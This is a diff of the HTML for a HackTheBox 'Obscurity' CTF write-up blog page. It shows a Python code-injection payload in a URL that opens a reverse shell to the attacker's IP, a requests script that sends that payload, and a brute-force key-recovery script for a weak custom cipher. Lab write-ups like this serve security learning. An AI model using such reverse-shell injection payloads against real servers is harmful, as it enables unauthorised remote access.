@@ -54,6 +54,25 @@
 <!-- </nav> -->
 
 <article>
+<table>
+<tbody>
+<tr class="odd">
+<td>title: Hackthebox - Obscurity Writeup</td>
+</tr>
+<tr class="even">
+<td>date: 2020-05-03</td>
+</tr>
+<tr class="odd">
+<td>description: Difficulty : easy, topics: python, fuzzing, john, crypto</td>
+</tr>
+<tr class="even">
+<td>tags: python, fuzzingk, john</td>
+</tr>
+<tr class="odd">
+<td>image: /img/htb_obscurity/card.png</td>
+</tr>
+</tbody>
+</table>
 <h1 id="hackthebox---obscurity-writeup">Hackthebox - Obscurity Writeup</h1>
 <p><img src="/img/htb_obscurity/card.png" /></p>
 <h1 id="initial-foothold">Initial Foothold</h1>
@@ -91,15 +110,15 @@ exec(info.format(path))</code></pre>
 <pre><code>/&#39;;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.184&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
 <p>So our web url with payload stands as: http://10.10.10.168:8080/‘;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.15.184”,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’</p>
 <p>We can write a python script that performs the request for us:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="im">import</span> requests</span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="im">import</span> os</span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a></span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a></span>
-<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>host <span class="op">=</span> <span class="st">&quot;http://10.10.10.168:8080/&quot;</span></span>
-<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a></span>
-<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a>payload <span class="op">=</span> <span class="st">&quot;</span><span class="sc">%27%</span><span class="st">0Aimport</span><span class="sc">%20s</span><span class="st">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span class="sc">%28s</span><span class="st">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span class="sc">%29%</span><span class="st">0As.connect</span><span class="sc">%28%</span><span class="st">28%2210.10.14.234</span><span class="sc">%22%</span><span class="st">2C1234</span><span class="sc">%29%</span><span class="st">29%0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C0</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C1</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C2</span><span class="sc">%29%</span><span class="st">0Ap%3Dsubprocess.call</span><span class="sc">%28%</span><span class="st">5B%22/bin/bash</span><span class="sc">%22%</span><span class="st">2C%22-i</span><span class="sc">%22%</span><span class="st">5D</span><span class="sc">%29%</span><span class="st">0A%27&quot;</span></span>
-<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a></span>
-<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a>requests.get(host<span class="op">+</span>payload)</span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>host <span class="op">=</span> <span class="st">&quot;http://10.10.10.168:8080/&quot;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;</span><span class="sc">%27%</span><span class="st">0Aimport</span><span class="sc">%20s</span><span class="st">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span class="sc">%28s</span><span class="st">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span class="sc">%29%</span><span class="st">0As.connect</span><span class="sc">%28%</span><span class="st">28%2210.10.14.234</span><span class="sc">%22%</span><span class="st">2C1234</span><span class="sc">%29%</span><span class="st">29%0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C0</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C1</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C2</span><span class="sc">%29%</span><span class="st">0Ap%3Dsubprocess.call</span><span class="sc">%28%</span><span class="st">5B%22/bin/bash</span><span class="sc">%22%</span><span class="st">2C%22-i</span><span class="sc">%22%</span><span class="st">5D</span><span class="sc">%29%</span><span class="st">0A%27&quot;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>requests.get(host<span class="op">+</span>payload)</span></code></pre></div>
 <p>We open a nc listener on port 1337 on our kali and enter the request to get a reverse shell</p>
 <p><img src="/img/htb_obscurity/6.png" /></p>
 <p>We upgrade our shell to a fully interactive one:</p>
@@ -113,45 +132,45 @@ exec(info.format(path))</code></pre>
 <p><img src="/img/htb_obscurity/9.png" /></p>
 <p>So, we have to find out the key of the user robert by briyteforcing and then use the key to decrypt the passwordreminder.txt using the script SuperSecureCrypt.py</p>
 <p>We write a decryptor in python</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="co">#! /usr/bin/env python3</span></span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a></span>
-<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="im">from</span> __future__ <span class="im">import</span> print_function</span>
-<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a></span>
-<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a></span>
-<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a><span class="kw">def</span> decrypt(text, key):</span>
-<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a>    keylen <span class="op">=</span> <span class="bu">len</span>(key)</span>
-<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a>    keyPos <span class="op">=</span> <span class="dv">0</span></span>
-<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a>    decrypted <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
-<span id="cb7-11"><a href="#cb7-11" aria-hidden="true"></a>    <span class="cf">for</span> x <span class="kw">in</span> text:</span>
-<span id="cb7-12"><a href="#cb7-12" aria-hidden="true"></a>        keyChr <span class="op">=</span> key[keyPos]</span>
-<span id="cb7-13"><a href="#cb7-13" aria-hidden="true"></a>        newChr <span class="op">=</span> <span class="bu">ord</span>(x)</span>
-<span id="cb7-14"><a href="#cb7-14" aria-hidden="true"></a>        newChr <span class="op">=</span> <span class="bu">chr</span>((newChr <span class="op">-</span> <span class="bu">ord</span>(keyChr)) <span class="op">%</span> <span class="dv">255</span>)</span>
-<span id="cb7-15"><a href="#cb7-15" aria-hidden="true"></a>        decrypted <span class="op">+=</span> newChr</span>
-<span id="cb7-16"><a href="#cb7-16" aria-hidden="true"></a>        keyPos <span class="op">+=</span> <span class="dv">1</span></span>
-<span id="cb7-17"><a href="#cb7-17" aria-hidden="true"></a>        keyPos <span class="op">=</span> keyPos <span class="op">%</span> keylen</span>
-<span id="cb7-18"><a href="#cb7-18" aria-hidden="true"></a>    <span class="cf">return</span> decrypted</span>
-<span id="cb7-19"><a href="#cb7-19" aria-hidden="true"></a></span>
-<span id="cb7-20"><a href="#cb7-20" aria-hidden="true"></a>key <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
-<span id="cb7-21"><a href="#cb7-21" aria-hidden="true"></a>pos <span class="op">=</span> <span class="dv">0</span></span>
-<span id="cb7-22"><a href="#cb7-22" aria-hidden="true"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;out.txt&quot;</span>, <span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;UTF-8&#39;</span>) <span class="im">as</span> f:</span>
-<span id="cb7-23"><a href="#cb7-23" aria-hidden="true"></a>    data <span class="op">=</span> f.read()</span>
-<span id="cb7-24"><a href="#cb7-24" aria-hidden="true"></a></span>
-<span id="cb7-25"><a href="#cb7-25" aria-hidden="true"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;check.txt&quot;</span>, <span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;UTF-8&#39;</span>) <span class="im">as</span> d:</span>
-<span id="cb7-26"><a href="#cb7-26" aria-hidden="true"></a>        ch <span class="op">=</span> d.read()</span>
-<span id="cb7-27"><a href="#cb7-27" aria-hidden="true"></a>        <span class="cf">for</span> x <span class="kw">in</span> data:</span>
-<span id="cb7-28"><a href="#cb7-28" aria-hidden="true"></a>            <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">255</span>):</span>
-<span id="cb7-29"><a href="#cb7-29" aria-hidden="true"></a>                <span class="co"># print(pos, end=&#39;&#39;)</span></span>
-<span id="cb7-30"><a href="#cb7-30" aria-hidden="true"></a>                <span class="co"># print(ch[pos], end=&#39;&#39;)</span></span>
-<span id="cb7-31"><a href="#cb7-31" aria-hidden="true"></a>                <span class="bu">print</span>(key <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
-<span id="cb7-32"><a href="#cb7-32" aria-hidden="true"></a>                newChr <span class="op">=</span> <span class="bu">ord</span>(x)</span>
-<span id="cb7-33"><a href="#cb7-33" aria-hidden="true"></a>                newChr <span class="op">=</span> <span class="bu">chr</span>((newChr <span class="op">-</span> j) <span class="op">%</span> <span class="dv">255</span>)</span>
-<span id="cb7-34"><a href="#cb7-34" aria-hidden="true"></a>                <span class="cf">if</span> ch[pos] <span class="op">==</span> newChr:</span>
-<span id="cb7-35"><a href="#cb7-35" aria-hidden="true"></a>                    key <span class="op">+=</span> <span class="bu">chr</span>(j)</span>
-<span id="cb7-36"><a href="#cb7-36" aria-hidden="true"></a>                    pos <span class="op">=</span> pos <span class="op">+</span> <span class="dv">1</span></span>
-<span id="cb7-37"><a href="#cb7-37" aria-hidden="true"></a>                    <span class="cf">break</span></span>
-<span id="cb7-38"><a href="#cb7-38" aria-hidden="true"></a></span>
-<span id="cb7-39"><a href="#cb7-39" aria-hidden="true"></a><span class="bu">print</span>(key)</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">#! /usr/bin/env python3</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co"># -*- coding: utf-8 -*-</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> __future__ <span class="im">import</span> print_function</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> decrypt(text, key):</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    keylen <span class="op">=</span> <span class="bu">len</span>(key)</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>    keyPos <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>    decrypted <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> x <span class="kw">in</span> text:</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>        keyChr <span class="op">=</span> key[keyPos]</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>        newChr <span class="op">=</span> <span class="bu">ord</span>(x)</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        newChr <span class="op">=</span> <span class="bu">chr</span>((newChr <span class="op">-</span> <span class="bu">ord</span>(keyChr)) <span class="op">%</span> <span class="dv">255</span>)</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>        decrypted <span class="op">+=</span> newChr</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>        keyPos <span class="op">+=</span> <span class="dv">1</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>        keyPos <span class="op">=</span> keyPos <span class="op">%</span> keylen</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> decrypted</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>key <span class="op">=</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>pos <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;out.txt&quot;</span>, <span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;UTF-8&#39;</span>) <span class="im">as</span> f:</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>    data <span class="op">=</span> f.read()</span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;check.txt&quot;</span>, <span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;UTF-8&#39;</span>) <span class="im">as</span> d:</span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>        ch <span class="op">=</span> d.read()</span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> x <span class="kw">in</span> data:</span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">255</span>):</span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>                <span class="co"># print(pos, end=&#39;&#39;)</span></span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>                <span class="co"># print(ch[pos], end=&#39;&#39;)</span></span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(key <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a>                newChr <span class="op">=</span> <span class="bu">ord</span>(x)</span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a>                newChr <span class="op">=</span> <span class="bu">chr</span>((newChr <span class="op">-</span> j) <span class="op">%</span> <span class="dv">255</span>)</span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> ch[pos] <span class="op">==</span> newChr:</span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a>                    key <span class="op">+=</span> <span class="bu">chr</span>(j)</span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a>                    pos <span class="op">=</span> pos <span class="op">+</span> <span class="dv">1</span></span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">break</span></span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(key)</span></code></pre></div>
 <p>Running the script, we find the key: <strong>alexandrovich</strong></p>
 <p>Now we decrypt the passwordremider.txt:</p>
 <p><img src="/img/htb_obscurity/10.png" /></p>
